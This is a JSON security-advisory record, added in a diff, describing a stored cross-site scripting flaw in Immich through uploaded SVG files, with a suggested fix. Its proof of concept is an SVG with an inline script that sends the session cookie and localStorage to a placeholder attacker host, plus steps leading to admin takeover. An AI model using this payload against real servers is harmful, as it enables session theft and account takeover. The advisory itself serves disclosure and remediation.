@@ -1,0 +1,50 @@
+{
+  "id": "GHSA-wjrq-m9hw-r4vq",
+  "aliases": [],
+  "title": "Stored XSS via SVG Asset",
+  "summary": "### Summary\r\nStored Cross-Site Scripting via an uploaded SVG asset: the file is served inline from `GET /api/assets/:id/original`; when served with the standard MIME type the inline `<script>` executes in Chrome and Firefox in the Immich origin, allowing theft of the `immich_access_token` session cookie (full admin takeover demonstrated).\r\n\r\n### Description\r\nThe server accepts `.svg` uploads (`server/src/utils/mime-types.ts:62`) and serves the original through `GET /api/assets/:id/original` with `Content-Disposition: inline` (`server/src/utils/file.ts:68-73`) under a global Content-Security-Policy that allows `'unsafe-inline'` scripts (`server/helmet.json:5`). An SVG containing an inline `<script>` executes when the document is rendered: browser tests (real Chrome and Firefox) confirmed execution when served as the standard `image/svg+xml` - top-level navigation and `<iframe>`/`<object>`/`<embed>` embedding. The script runs in the Immich origin and can read `document.cookie`; the full chain to a created admin account was demonstrated.\r\n\r\n**Exploitability caveat:** the server currently returns the non-standard MIME type `image/svg` instead of `image/svg+xml`, and current Chrome (downloads the file) and Firefox (renders as an image) do not execute scripts for that type. This is an accidental, fragile mitigation - not a defense. Any change to the standard MIME type (a likely bug-fix) activates the vulnerability; Safari is untested.\r\n### Steps to reproduce / POC\r\n1. Upload `evil.svg` (escape `&` as `&amp;` inside `<script>` - raw `&` breaks XML parsing):\r\n   ```xml\r\n   <?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n   <svg xmlns=\"http://www.w3.org/2000/svg\" width=\"100\" height=\"100\">\r\n     <script type=\"text/javascript\">\r\n       var i = new Image();\r\n       i.src = \"http://<ATTACKER>:PORT/xss-callback?d=\" +\r\n               encodeURIComponent(JSON.stringify({cookie: document.cookie, ls: localStorage}));\r\n       document.body.appendChild(i);\r\n     </script>\r\n     <rect width=\"100\" height=\"100\" fill=\"red\"/>\r\n   </svg>\r\n   ```\r\n2. Upload via `POST /api/assets`, or expose via a public shared link and have the victim open it.\r\n3. Victim opens `GET /api/assets/:id/original` (or the shared-link URL).\r\n4. When served as `image/svg+xml`, Chrome/Firefox execute the script; `document.cookie` (containing `immich_access_token`) is exfiltrated.\r\n5. The attacker uses the token against the admin API (verified: read system config, create a user, promote it to `isAdmin`).\r\n\r\n### Impact\r\n- Session theft leading to full admin takeover (entire chain reproduced).\r\n- SVG reachable to anonymous visitors via public shared links.\r\n- Can be combined with the workflow/storage-template issues for further impact (cross-user file write reproduced).\r\n\r\n### Suggested fix\r\n1. Force `Content-Disposition: attachment` for SVG originals (add a `disposition` option to `ImmichFileResponse`/`sendFile` in `server/src/utils/file.ts`, set it in `downloadOriginal` in `server/src/services/asset-media.service.ts` when `contentType.startsWith('image/svg')`).\r\n2. **Simultaneously** correct the `.svg` MIME type to `image/svg+xml` (`server/src/utils/mime-types.ts:62`). Items 1 and 2 must land together - fixing the MIME alone activates the vulnerability.\r\n3. Optionally: remove `'unsafe-inline'` from the global CSP `script-src` (requires a SvelteKit nonce/hash plan; assess separately), or disallow `.svg` asset uploads entirely.",
+  "published_at": "2026-11-10T18:45:25.000Z",
+  "modified_at": "2026-11-10T18:45:25.000Z",
+  "severity": {
+    "level": "low",
+    "score": null,
+    "vector": null,
+    "source": "ghsa"
+  },
+  "kev": {
+    "listed": false,
+    "added_at": null,
+    "checked": true
+  },
+  "epss": null,
+  "cwes": [
+    "CWE-79"
+  ],
+  "affected": [
+    {
+      "product": "immich",
+      "ranges": [
+        {
+          "introduced": "0",
+          "fixed": "3.4.0"
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "url": "https://github.com/immich-app/immich/security/advisories/GHSA-wjrq-m9hw-r4vq",
+      "type": "advisory"
+    }
+  ],
+  "sources": [
+    {
+      "type": "ghsa",
+      "id": "GHSA-wjrq-m9hw-r4vq",
+      "url": "https://github.com/immich-app/immich/security/advisories/GHSA-wjrq-m9hw-r4vq",
+      "license": "CC-BY-4.0"
+    }
+  ],
+  "revision": "sha256:84c7adfb8a24481bbd0da3607a15bab31a125dec8c424cf3af2b31f0ae5988fb",
+  "note": null
+}
